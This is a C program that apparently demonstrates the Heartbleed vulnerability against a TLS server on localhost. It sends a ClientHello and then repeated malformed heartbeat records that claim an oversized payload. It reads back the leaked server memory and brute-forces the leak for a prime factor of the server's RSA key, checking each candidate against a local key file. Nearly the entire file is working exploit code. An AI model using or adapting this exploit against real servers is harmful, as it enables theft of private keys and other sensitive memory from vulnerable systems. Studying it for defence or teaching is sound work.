#include <stdio.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/bn.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h>
#include <signal.h>

#define BYTE_KEY 128

#define HB_BUFF  262144
#define HELLO_LEN 320
#define HB_LEN 8
#define SERV_HELLO 4096
#define KEY_SCRAMBLED 301


int connect_to_server(struct sockaddr_in *serv_addr) {
    int sock = 0;
    printf("\nInitializing new connection...\n");
    sock=socket(AF_INET,SOCK_STREAM,0);
    
    serv_addr->sin_family = AF_INET;
    serv_addr->sin_port = htons(443);
    serv_addr->sin_addr.s_addr=inet_addr("127.0.0.1");
    
    printf("Connecting...\n");
    connect(sock, (struct sockaddr *)serv_addr, sizeof(*serv_addr));  
    printf("Connected!\n");
    return sock;

}
    

int main() {

    FILE *fp_pk, *fp_bleed;

    RSA *pk = NULL;
    BN_CTX *temp;
    BIGNUM *pk_q_test, *reminder;

    unsigned int cycle, num_read, i;
    char *buff;
    char serv_buff[SERV_HELLO];
    char *hb_buff;
    int sock;
    char ssl_hb[HB_LEN] =
    {
        0x18, 0x03, 0x00, 0x00, 0x03, 0x01, 0xFF, 0xFF
    };
    
    char ssl_hello[HELLO_LEN] = 
        { 
        0x16,0x03,0x01,0x01,0x3b,0x01,0x00,0x01,0x37,0x03,0x00,0x53,
        0x62,0x5b,0xaf,0x9e,0x24,0x6,0x6a,0x9d,0xb7,0x46,0x49,0x11,
        0xd5,0xa8,0xa5,0x52,0x53,0x95,0x78,0x41,0x7b,0x37,0xb0,0x48,
        0xf2,0x18,0xc4,0x8a,0x83,0x3b,0xe6,0x00,0x00,0x9e,0xc0,0x30,
        0xc0,0x2c,0xc0,0x28,0xc0,0x24,0xc0,0x14,0xc0,0x0a,0xc0,0x22,
        0xc0,0x21,0x00,0xa3,0x00,0x9f,0x00,0x6b,0x00,0x6a,0x00,0x39,
        0x00,0x38,0x00,0x88,0x00,0x87,0xc0,0x32,0xc0,0x2e,0xc0,0x2a,
        0xc0,0x26,0xc0,0x0f,0xc0,0x05,0x00,0x9d,0x00,0x3d,0x00,0x35,
        0x00,0x84,0xc0,0x12,0xc0,0x08,0xc0,0x1c,0xc0,0x1b,0x00,0x16,
        0x00,0x13,0xc0,0x0d,0xc0,0x03,0x00,0x0a,0xc0,0x2f,0xc0,0x2b,
        0xc0,0x27,0xc0,0x23,0xc0,0x13,0xc0,0x09,0xc0,0x1f,0xc0,0x1e,
        0x00,0xa2,0x00,0x9e,0x00,0x67,0x00,0x40,0x00,0x33,0x00,0x32,
        0x00,0x9a,0x00,0x99,0x00,0x45,0x00,0x44,0xc0,0x31,0xc0,0x2d,
        0xc0,0x29,0xc0,0x25,0xc0,0x0e,0xc0,0x04,0x00,0x9c,0x00,0x3c,
        0x00,0x2f,0x00,0x96,0x00,0x41,0xc0,0x11,0xc0,0x07,0xc0,0x0c,
        0xc0,0x02,0x00,0x05,0x00,0x04,0x00,0x15,0x00,0x12,0x00,0x09,
        0x00,0x14,0x00,0x11,0x00,0x08,0x00,0x6,0x00,0x03,0x00,0xff,
        0x02,0x01,0x00,0x00,0x6f,0x00,0x0b,0x00,0x04,0x03,0x00,0x01,
        0x02,0x00,0x0a,0x00,0x34,0x00,0x32,0x00,0x0e,0x00,0x0d,0x00,
        0x19,0x00,0x0b,0x00,0x0c,0x00,0x18,0x00,0x09,0x00,0x0a,0x00,
        0x16,0x00,0x17,0x00,0x08,0x00,0x6,0x00,0x07,0x00,0x14,0x00,
        0x15,0x00,0x04,0x00,0x05,0x00,0x12,0x00,0x13,0x00,0x01,0x00,
        0x02,0x00,0x03,0x00,0x0f,0x00,0x10,0x00,0x11,0x00,0x23,0x00,
        0x00,0x00,0x0d,0x00,0x22,0x00,0x20,0x6,0x01,0x6,0x02,0x6,
        0x03,0x05,0x01,0x05,0x02,0x05,0x03,0x04,0x01,0x04,0x02,0x04,
        0x03,0x03,0x01,0x03,0x02,0x03,0x03,0x02,0x01,0x02,0x02,0x02,
        0x03,0x01,0x01,0x00,0x0f,0x00,0x01,0x01 
        };
    
    signal(SIGPIPE, SIG_IGN);
    unsigned int count = 0;
    int n_read, resp_len, lost =0 , bytes_lost=0;
    int bytes_avail;
    
    hb_buff = (char *) malloc(HB_BUFF*sizeof(char)); 
    fp_pk = fopen("private_unencrypted.pem", "rb");
    pk = PEM_read_RSAPrivateKey(fp_pk,NULL,NULL,NULL);
    fclose(fp_pk);

    if(pk == NULL) {
         printf("Error while reading the private key");
        return 1;
    }
	
    struct sockaddr_in serv_addr;
    sock = connect_to_server(&serv_addr);

    int w = write(sock, ssl_hello, HELLO_LEN);
    /*
     * Reads the server  HELLO 
     */
    n_read = recv(sock, serv_buff, 4096, 0);

    temp = BN_CTX_new();
    pk_q_test = BN_new();
    reminder = BN_new();
    
    while(1) {
        /*
         * Sends the malformed heartbeat message 
         */
        int w  = write(sock, ssl_hb, HB_LEN);

        /*
         * Returns -1 if the connection was closed by the server.
         * Tries to connect again.
         */
        if(w==-1) {
            close(sock);
            sock = connect_to_server(&serv_addr);

            int w = write(sock, ssl_hello, HELLO_LEN);
 	    /*
             * Reads the server  HELLO 
             */
    	    n_read = recv(sock, serv_buff, 4096, 0);
	   
	     continue;
        }

        bytes_avail = 0, n_read =0, resp_len = 0;
        
        /*
         * Reads the first chunk of bytes from the 
         * server. Increments the pointer in the receiving
         * buffer for the next chunk.
         */
        n_read = recv(sock, hb_buff+resp_len, 4096, 0); 
        resp_len += n_read;
        do {
            /*
            i * Requests the number of bytes available to be
             * read from the TCP buffer. If there's nothing
             * to read, waits 500ms and tries again. If the
             * receiving buffer is empty this second time, 
             * assumes the response from the server is over.
             * Otherwise keeps on reading.
             */
            ioctl (sock,FIONREAD, &bytes_avail);
            if(bytes_avail == 0) {
               
                sleep(0.5);
                ioctl (sock,FIONREAD, &bytes_avail);
                if(bytes_avail == 0) 
                    break;
            }
            n_read = recv(sock, hb_buff+resp_len, 4096, 0);
            resp_len += n_read;
        } while(1);

        printf("hb req: %6d, resplen: %6d\r",
                count,
                resp_len);

        /*
         * Flushes the standard output, as there's no newline in the buffer.
         * If we got a response from the server < BYTE_KEY, there is no
         * point in looking for a 1024 bit key. Actually the lenght of the 
         * proper HB message should be taken into consideration.
         */
        fflush(0);

        if(resp_len < BYTE_KEY) {
            continue;
        }
        
        /*
         * Brute force loop to check every possible 128 bytes buffer
         */

        for(i=0; i<resp_len-BYTE_KEY+1; i++) {

            BN_bin2bn((unsigned char*)(hb_buff+i), BYTE_KEY, pk_q_test);
            if(BN_is_one(pk_q_test) || BN_is_zero(pk_q_test))

                continue;
            BN_mod(reminder, pk->n, pk_q_test, temp);
            if(BN_is_zero(reminder)) {
                FILE *f_key = fopen("key_found", "w");
                fprintf(f_key,"%s", BN_bn2hex(pk_q_test));

                printf("\nThe key was found:\n\n");
                printf("%s\n",BN_bn2hex(pk_q_test));

                return 0;
            }
        }
        count++;
    }  
} 
